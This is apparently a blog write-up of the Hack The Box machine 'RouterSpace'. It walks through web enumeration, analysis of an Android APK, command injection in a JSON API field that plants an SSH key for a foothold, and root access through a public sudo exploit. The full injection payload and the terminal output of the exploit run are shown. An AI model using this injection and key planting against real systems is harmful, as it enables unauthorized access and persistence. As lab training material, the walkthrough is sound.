---
title: RouterService
layout: base.njk
description: >
  A short description of page
tags:
  - post
  - hackTheBoxPost
---

# Intro
Good morning all!
This box is presumably easy, but it is challenging for many as they are forced to learn something about android debugging. I do reccomend it as you learn about apk files and get some verry useful tools that will be handy on a daily basis!

# Enumeration
So as always I start with a nmap scan, this shows me where I should start directing my efforts. It looks like a server on port 80. So I check that out while firing up dirb and nikto.
Quickly I realize that dirb and nikto are useless. They get a hit on everything they try to enumerate. 
```bash
#Dirb output
+ http://10.129.167.150/_vti_cnf (CODE:200|SIZE:71)
+ http://10.129.167.150/_vti_inf (CODE:200|SIZE:77)
+ http://10.129.167.150/_vti_log (CODE:200|SIZE:69)
+ http://10.129.167.150/_vti_map (CODE:200|SIZE:71)
+ http://10.129.167.150/_vti_rpc (CODE:200|SIZE:70)
+ http://10.129.167.150/_vti_script (CODE:200|SIZE:75)
+ http://10.129.167.150/_vti_txt (CODE:200|SIZE:71)
+ http://10.129.167.150/_www (CODE:200|SIZE:80)
+ http://10.129.167.150/~adm (CODE:200|SIZE:73)
+ http://10.129.167.150/~admin (CODE:200|SIZE:71)
+ http://10.129.167.150/~administrator (CODE:200|SIZE:73)
(!) WARNING: Too many responses for this directory seem to be FOUND.
    (Something is going wrong - Try Other Scan Mode)
    (Use mode '-w' if you want to scan it anyway)        
-----------------
END_TIME: Sat Feb 26 14:43:58 2022
DOWNLOADED: 107 - FOUND: 101
                                           
```
So lets debug that. Upon trying to go to a random page I know shouldn't return results `http://10.129.167.150/Follow@TheCtrl+X` it always returns a `200 OK` and shows me a warning "suspicious activity screen".
Ok fine, so lets bypass this. Therefore I started wfuzz and tried to run the same type of directory discovery, but I filtered out "Suspicious activity".
Here is the results
```
┌──(kali㉿kali)-[~/Documents/HTB/RouterSpace]
└─$ wfuzz -c -w /usr/share/wordlists/seclist/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --hs "Suspicious activity*" http://10.129.167.150/FUZZ 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://10.129.167.150/FUZZ
Total requests: 1185254
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000001:   200        536 L    1382 W     25900 Ch    "# directory-list-lowercase-2.3-big.txt"
000000003:   200        536 L    1382 W     25900 Ch    "# Copyright 2007 James Fisher"
000000007:   200        536 L    1382 W     25900 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
000000014:   200        536 L    1382 W     25900 Ch    "http://10.129.167.150/" 
000000013:   200        536 L    1382 W     25900 Ch    "#" 
000000006:   200        536 L    1382 W     25900 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this" 
000000010:   200        536 L    1382 W     25900 Ch    "#"
000000008:   200        536 L    1382 W     25900 Ch    "# or send a letter to Creative Commons, 171 Second Street," 
000000012:   200        536 L    1382 W     25900 Ch    "# on at least 1 host" 
000000011:   200        536 L    1382 W     25900 Ch    "# Priority-ordered case-insensitive list, where entries were found" 
000000009:   200        536 L    1382 W     25900 Ch    "# Suite 300, San Francisco, California, 94105, USA."
000000002:   200        536 L    1382 W     25900 Ch    "#"
000000005:   200        536 L    1382 W     25900 Ch    "# This work is licensed under the Creative Commons" 
000000004:   200        536 L    1382 W     25900 Ch    "#" 
000000039:   301        10 L     16 W       173 Ch      "img"
000000547:   301        10 L     16 W       173 Ch      "css" 
000000920:   301        10 L     16 W       171 Ch      "js" 
000002576:   301        10 L     16 W       177 Ch      "fonts"
```
Ok, so we found four valid pages `/img/, /css/, /js/, /fonts/` the other results are just error caused by the #. This will direct the browser to the index.html page.
So this is a dead end.
But the main page has a filedownload. Here you can download a file called router-service.apk.

# Enumerating the .apk
So a apk file is a android app that has been zipped in the simplest explanation, in depth it is a type of java archive (JAR). The majority of apps are presumably built in java, so treating it like that really simplyfies the process. The apks can easily be unzipped by most extraction tools, but you might need extra programs to really read the metadata as a simple unzip might not be able to convert the binaries to readable format. I'm not an expert at analyzing apk's so I apologize if some of the information here is lacking an in depth analysist.
Ok so there are two methods for breaking analyzing the apk files. You either do a static analysist or run a dynamic instance and see what it does. For this writeup I will preform both to try to find what secrets lie beneth the hood of the apk.
To really understand what you are doing, I strongly reccommend the talk by ![`_R00T_`](https://www.youtube.com/watch?v=NrxTBcjAL8A) at Mystikcon 2020.

## Static analysist
So static analysist, this approach requires you to unpack the apk file and manually look through the files for anomalies or secrets. It can be verry time comsuming but it can also be automated. First and formost we have to unpack the file. The easiest way to do so is by using apktool. Simply by using `apktool d router-service.apk`. It decompiles it and we can now explore the contents.
Ok before running strings and finding every secret you can, lets explain the contents you should check first and what they are:
- AndroidManifest.xml
- classes.dex
- resources.arsc
- /res/
- META-INF

AndroidManifest.xml is the metadata about the app. It has the permissions required, what kind of activities/events it does, version, name and so on. So that is a nice start to understand it. An activity/event is everything it does.
Further the /res/ directory is what kind of resources it has.



https://mobsf.github.io/docs/#/docker
https://docs.docker.com/engine/install/
https://www.kali.org/docs/containers/installing-docker-on-kali/
Installed docker and mobsf for static analysist of the app
Didn't find anything interesting

## Dynamic analysist
Installed Genymotion on desktop
Installed Frida on kali
Started adb and connected it to genymotion
Pushed the frida-server package to genymotion so i can try to pass and dynamicly read the app

## Dynamic analysist
Started the app with a default Samsung Galaxy 7 Build
Then installed the app
Further used adb to connect
Used adb to edit the /etc/hosts of the phone
```
adb connect 1292.168.149.191
adb pull /system/etc/hosts hosts
adb shell mount -o rw,remount /system #To add read write to the phone
adb push hosts /sytem/etc/hosts
adb shell mount -o ro,remount /system #Change back to read
```

Fired up wireshark to find what kind of requests were happening:
```
POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
accept: application/json, text/plain, */*
user-agent: RouterSpaceAgent
Content-Type: application/json
Content-Length: 16
Host: routerspace.htb
Connection: Keep-Alive
Accept-Encoding: gzip

{"ip":"0.0.0.0"}

HTTP/1.1 200 OK
X-Powered-By: RouterSpace
X-Cdn: RouterSpace-96800
Content-Type: application/json; charset=utf-8
Content-Length: 11
ETag: W/"b-ANdgA/PInoUrpfEatjy5cxfJOCY"
Date: Mon, 28 Feb 2022 20:45:41 GMT
Connection: keep-alive

"0.0.0.0\n"
```


Send it over to burp


# Foothold
SSH Keygen
```
┌──(kali㉿kali)-[~/Documents/HTB/RouterSpace]                      
└─$ ssh-keygen -f mykey       
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in mykey 
Your public key has been saved in mykey.pub
The key fingerprint is:
SHA256:dgsgargddrftSDFeEGeGSEdDGGFXZDGuXQ0GPlDHysDQ kali@kali                                                                                                                                                                                
The key's randomart image is:
...
```
Send it to burp

```

```
POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1

accept: application/json, text/plain, */*

user-agent: RouterSpaceAgent

Content-Type: application/json

Content-Length: 616

Host: routerspace.htb

Connection: Keep-Alive

Accept-Encoding: gzip



{"ip":"0.0.0.0; echo 'ssh-rsa AAAASLDKHFjaswkjdfksajdhsdKAvdPa49+KqTxB9kjshadfKJLLKJSHfkjhsdafsp8v9+wFHyf53iRBPe94vTUfSPi8C480oBWSpvtNN9xWwA6F8TlfqSno9ICxljjPlWtEIjPub9vOtgJKHSDfkjhsadkjhsadfKJHSDKfjhcV+jPaslkdflKKJHfkjsahdfkjhgsakdjh/4cbk4+mX5GmJP/2i/QEJ1oK2bFa5sJOh6J5m8xxJGknXG9fUua3U1Oaon2Bp/JKHSDflkjhawrfkjHSDFKJ8+VV5KAz2dDjxwFg0rIOSIDHJFkjwahedfkjlshldlflkjLIUDFhsf0c5s3g+snysqs= paul' > /home/paul/.ssh/authorized_keys"}

------------------------------
RESPONSE
HTTP/1.1 200 OK

X-Powered-By: RouterSpace

X-Cdn: RouterSpace-4166

Content-Type: application/json; charset=utf-8

Content-Length: 11

ETag: W/"b-ANdgA/PInoUrpfEatjy5cxfJOCY"

Date: Tue, 01 Mar 2022 18:51:19 GMT

Connection: keep-alive



"0.0.0.0\n"
https://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet
```
┌──(kali㉿kali)-[~/Documents/HTB/RouterSpace]
└─$ ssh -i mykey paul@10.129.174.184                                                                                                                                                                                              255 ⨯ 1 ⚙
Enter passphrase for key 'mykey': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 01 Mar 2022 06:51:34 PM UTC

  System load:           0.04
  Usage of /:            70.5% of 3.49GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             215
  Users logged in:       0
  IPv4 address for eth0: 10.129.174.184
  IPv6 address for eth0: dead:beef::250:56ff:fe96:8166

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

80 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Nov 20 18:30:35 2021 from 192.168.150.133
paul@routerspace:~$ 
```

# Enumeration
Send linpeas with ssh
```
──(kali㉿kali)-[/opt/PEASS-ng/linPEAS]
└─$ scp -i /home/kali/Documents/HTB/RouterSpace/mykey linpeas.sh paul@10.129.174.184:/home/paul/  
Enter passphrase for key '/home/kali/Documents/HTB/RouterSpace/mykey': 
linpeas.sh

╔══════════╣ Sudo version                                                                                                                                                                                                                   
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                                                                                                  
Sudo version 1.8.31 
```
https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit


```
paul@routerspace:~$ sudoedit -s Y
[sudo] password for paul:
```

# Privesc
```
paul@routerspace:~$ vim shellcode.c
paul@routerspace:~$ vim exploit.c
paul@routerspace:~$ vim Makefile
paul@routerspace:~$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
paul@routerspace:~$ ls
exploit  exploit.c  libnss_x  linpeas.sh  Makefile  shellcode.c  snap  user.txt
paul@routerspace:~$ ./exploit 
# ls
Makefile  exploit  exploit.c  libnss_x  linpeas.sh  shellcode.c  snap  user.txt
# whoami
root
# cd /root
# ls
root.txt
```
